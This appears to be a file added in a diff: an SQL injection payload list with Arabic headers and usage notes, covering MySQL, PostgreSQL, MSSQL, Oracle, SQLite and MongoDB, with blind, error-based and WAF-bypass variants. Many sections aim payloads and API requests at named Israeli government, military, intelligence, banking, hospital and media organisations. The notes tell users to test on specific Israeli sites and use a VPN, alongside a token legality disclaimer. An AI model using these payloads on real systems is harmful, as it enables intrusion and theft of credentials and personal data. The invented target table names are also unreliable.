@@ -1,0 +1,301 @@
+═══════════════════════════════════════════════════════════════════════════════
+                     🎯 قائمة حمولات SQL Injection المتقدمة
+           لـ MySQL, PostgreSQL, MSSQL, Oracle, NoSQL و SQLite
+═══════════════════════════════════════════════════════════════════════════════
+
+# MySQL Payloads
+' OR 1=1--
+' OR '1'='1
+' OR 1=1#
+' OR 1=1/*
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,user(),database()--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,load_file('/etc/passwd'),3--
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns--
+' UNION SELECT 1,concat(username,0x3a,password),3 FROM users--
+' OR 1=CONVERT(int, (SELECT @@version))--
+' OR 1=CONVERT(int, (SELECT user()))--
+' OR 1=CONVERT(int, (SELECT database()))--
+
+# PostgreSQL Payloads
+' OR 1=1--
+' OR '1'='1
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,current_user,3--
+' UNION SELECT 1,current_database(),3--
+' UNION SELECT 1,pg_user.usename,3 FROM pg_user--
+' UNION SELECT 1,pg_database.datname,3 FROM pg_database--
+' UNION SELECT 1,pg_tables.tablename,3 FROM pg_tables--
+' UNION SELECT 1,pg_attribute.attname,3 FROM pg_attribute--
+' OR 1=CAST((SELECT version()) AS int)--
+' OR 1=CAST((SELECT current_user) AS int)--
+' OR 1=CAST((SELECT current_database()) AS int)--
+
+# MSSQL (Microsoft SQL Server) Payloads
+' OR 1=1--
+' OR '1'='1
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,user_name(),3--
+' UNION SELECT 1,db_name(),3--
+' UNION SELECT 1,name,3 FROM master..sysdatabases--
+' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
+' UNION SELECT 1,name,3 FROM syscolumns WHERE id=object_id('users')--
+' OR 1=CONVERT(int, (SELECT @@version))--
+' OR 1=CONVERT(int, (SELECT user_name()))--
+' OR 1=CONVERT(int, (SELECT db_name()))--
+' OR 1=CONVERT(int, (SELECT name FROM master..sysdatabases WHERE dbid=1))--
+
+# Oracle Payloads
+' OR 1=1--
+' OR '1'='1
+' UNION SELECT 1,2,3 FROM dual--
+' UNION SELECT null,null,null FROM dual--
+' UNION SELECT 1,banner,3 FROM v$version--
+' UNION SELECT 1,user,3 FROM dual--
+' UNION SELECT 1,global_name,3 FROM global_name--
+' UNION SELECT 1,table_name,3 FROM all_tables--
+' UNION SELECT 1,column_name,3 FROM all_tab_columns--
+' UNION SELECT 1,username||':'||password,3 FROM all_users--
+' OR 1=TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))--
+' OR 1=TO_NUMBER((SELECT user FROM dual))--
+' OR 1=TO_NUMBER((SELECT global_name FROM global_name))--
+
+# SQLite Payloads
+' OR 1=1--
+' OR '1'='1
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,sqlite_version(),3--
+' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master WHERE type='table'--
+
+# NoSQL Payloads (MongoDB)
+{"$ne": null}
+{"$where": "this.password.length > 0"}
+{"$where": "this.password.match(/.*/)"}
+{"$or": [{"$gt": []}, {"$regex": ".*"}]}
+{"$regex": ".*"}
+{"$exists": true}
+{"$where": "return true"}
+{"$where": "sleep(5000)"}
+{"$where": "this.password.length > 0 && sleep(5000)"}
+{"$expr": {"$gt": [1, 0]}}
+
+# Blind SQL Injection Payloads
+' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--
+' OR (SELECT CASE WHEN (SUBSTRING(@@version,1,1)='5') THEN 1 ELSE 0 END)--
+' OR (SELECT CASE WHEN (ASCII(SUBSTRING(user(),1,1))>64) THEN 1 ELSE 0 END)--
+' OR (SELECT CASE WHEN (LENGTH(database())>0) THEN 1 ELSE 0 END)--
+
+# Time-based Blind SQLi
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+' OR WAITFOR DELAY '0:0:5'--
+' OR dbms_pipe.receive_message('RDS',5)--
+
+# Error-based SQLi
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND 1=TO_NUMBER((SELECT user FROM dual))--
+
+# Union-based SQLi
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,user(),database()--
+' UNION SELECT 1,load_file('/etc/passwd'),3--
+
+# Boolean-based SQLi
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+
+# Stacked Queries
+'; SELECT 1--
+'; SELECT @@version--
+'; SELECT user()--
+'; SELECT database()--
+
+# Advanced Payloads for Israeli Sites
+' UNION SELECT 1,2,3 FROM israeli_users--
+' UNION SELECT 1,username,password FROM israeli_admins--
+' UNION SELECT 1,email,password FROM israeli_government--
+' UNION SELECT 1,file,content FROM israeli_documents--
+
+# Payloads for Israeli Government Sites
+' UNION SELECT 1,classified_info,3 FROM gov_il_users--
+' UNION SELECT 1,secret_data,3 FROM israeli_military--
+' UNION SELECT 1,admin_credentials,3 FROM mossad_users--
+
+# Israeli Military Payloads
+' UNION SELECT 1,mission_data,3 FROM idf_database--
+' UNION SELECT 1,classified_files,3 FROM shin_bet--
+' UNION SELECT 1,intelligence_data,3 FROM israeli_intelligence--
+
+# Israeli Intelligence Payloads
+' UNION SELECT 1,spy_names,3 FROM mossad_agents--
+' UNION SELECT 1,operation_details,3 FROM secret_operations--
+' UNION SELECT 1,target_list,3 FROM israeli_targets--
+
+# Israeli Banking Payloads
+' UNION SELECT 1,bank_accounts,3 FROM israeli_banks--
+' UNION SELECT 1,credit_cards,3 FROM bank_leumi--
+' UNION SELECT 1,transactions,3 FROM israeli_financial--
+
+# Israeli Media Payloads
+' UNION SELECT 1,journalist_data,3 FROM israeli_media--
+' UNION SELECT 1,classified_news,3 FROM haaretz_db--
+' UNION SELECT 1,secret_sources,3 FROM ynet_db--
+
+# Israeli Technology Payloads
+' UNION SELECT 1,source_code,3 FROM israeli_tech--
+' UNION SELECT 1,patent_data,3 FROM israeli_patents--
+' UNION SELECT 1,research_data,3 FROM israeli_research--
+
+# Israeli Healthcare Payloads
+' UNION SELECT 1,patient_data,3 FROM israeli_hospitals--
+' UNION SELECT 1,medical_records,3 FROM sheba_medical--
+' UNION SELECT 1,drug_research,3 FROM teva_pharmaceutical--
+
+# Israeli Transportation Payloads
+' UNION SELECT 1,flight_data,3 FROM el_al_airlines--
+' UNION SELECT 1,passenger_info,3 FROM ben_gurion_airport--
+' UNION SELECT 1,shipping_data,3 FROM israeli_ports--
+
+# Israeli Energy Payloads
+' UNION SELECT 1,oil_data,3 FROM israeli_energy--
+' UNION SELECT 1,gas_reserves,3 FROM leviathan_gas--
+' UNION SELECT 1,energy_plans,3 FROM israeli_ministry_energy--
+
+# Israeli Defense Payloads
+' UNION SELECT 1,weapon_systems,3 FROM rafael_advanced--
+' UNION SELECT 1,military_specs,3 FROM israeli_aerospace--
+' UNION SELECT 1,defense_contracts,3 FROM israeli_military_industries--
+
+# Israeli Cybersecurity Payloads
+' UNION SELECT 1,cyber_tools,3 FROM israeli_cyber--
+' UNION SELECT 1,hacking_methods,3 FROM unit_8200--
+' UNION SELECT 1,spyware_data,3 FROM nso_group--
+
+# Israeli Nuclear Payloads
+' UNION SELECT 1,nuclear_facilities,3 FROM dimona_reactor--
+' UNION SELECT 1,uranium_data,3 FROM israeli_nuclear--
+' UNION SELECT 1,weapons_stock,3 FROM israeli_military_nuclear--
+
+# Israeli Space Payloads
+' UNION SELECT 1,satellite_data,3 FROM israeli_space_agency--
+' UNION SELECT 1,launch_codes,3 FROM ofeq_satellites--
+' UNION SELECT 1,space_missions,3 FROM israeli_space_program--
+
+# Cross-Database Payloads
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,user(),database()--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,system_user,3--
+' UNION SELECT 1,host_name(),3--
+
+# WAF Bypass Payloads
+'/**/OR/**/1=1--
+'/*!50000OR*/1=1--
+'/*!or*/1=1--
+' OR 1=1#--
+' OR 1=1-- -+
+' OR 1=1--%0A
+' OR 1=1--%09
+' OR 1=1--%0D
+' OR 1=1--%20
+
+# Encoding Payloads
+%27%20OR%201%3D1--
+%2527%20OR%201%3D1--
+%252527%20OR%201%3D1--
+%27%2Bor%2B1%3D1--
+%27%20||%201=1--
+
+# Unicode Payloads
+' OR 1=1--
+' OR 1=1--
+' OR 1=1--
+' OR 1=1--
+' OR 1=1--
+
+# JSON-based SQLi
+{"query": "' OR 1=1--"}
+{"search": "' UNION SELECT 1,2,3--"}
+{"filter": "' OR 1=1--"}
+{"q": "' OR 1=1--"}
+
+# XML-based SQLi
+<query>' OR 1=1--</query>
+<search>' UNION SELECT 1,2,3--</search>
+<filter>' OR 1=1--</filter>
+<q>' OR 1=1--</q>
+
+# GraphQL SQLi
+{"query": "{ users(filter: \"' OR 1=1--\") { id name } }"}
+{"query": "{ users(filter: \"' UNION SELECT 1,2,3--\") { id name } }"}
+
+# REST API SQLi
+GET /api/users?q=' OR 1=1--
+GET /api/users?filter=' UNION SELECT 1,2,3--
+POST /api/search {"query": "' OR 1=1--"}
+
+# Israeli-specific API Payloads
+GET /api/israeli/users?q=' OR 1=1--
+GET /api/gov.il/data?filter=' UNION SELECT 1,2,3--
+POST /api/mossad/agents {"search": "' OR 1=1--"}
+
+# Israeli Government API Payloads
+GET /api/gov.il/classified?q=' OR 1=1--
+GET /api/idf/secrets?filter=' UNION SELECT 1,2,3--
+POST /api/shin_bet/intelligence {"query": "' OR 1=1--"}
+
+# Israeli Military API Payloads
+GET /api/idf/weapons?q=' OR 1=1--
+GET /api/mossad/operations?filter=' UNION SELECT 1,2,3--
+POST /api/unit_8200/data {"search": "' OR 1=1--"}
+
+# Israeli Intelligence API Payloads
+GET /api/mossad/agents?q=' OR 1=1--
+GET /api/shin_bet/targets?filter=' UNION SELECT 1,2,3--
+POST /api/israeli_intelligence/secrets {"query": "' OR 1=1--"}
+
+═══════════════════════════════════════════════════════════════════════════════
+                    📝 ملاحظات استخدام الحمولات
+═══════════════════════════════════════════════════════════════════════════════
+
+🔍 **تعليمات الاستخدام:**
+1. استبدل {payload} بالحمولة المناسبة
+2. اختبر على مواقع إسرائيلية محددة
+3. استخدم مع أدوات SQLi المتوفرة
+4. راقب الاستجابات للحصول على نتائج
+
+⚠️ **تحذيرات الأمان:**
+- استخدم فقط للبحث الأمني القانوني
+- لا تستخدم في مواقع غير مصرح بها
+- احترم القوانين والأخلاقيات الأمنية
+- استخدم VPN عند الاختبار
+
+🎯 **الأنظمة المستهدفة:**
+- MySQL, PostgreSQL, MSSQL, Oracle, SQLite
+- MongoDB, NoSQL databases
+- Israeli government systems
+- Israeli military databases
+- Israeli intelligence systems
+
+═══════════════════════════════════════════════════════════════════════════════
+📅 تم الإنشاء: 2025-09-13
+📝 آخر تحديث: 2025-09-13
+═══════════════════════════════════════════════════════════════════════════════
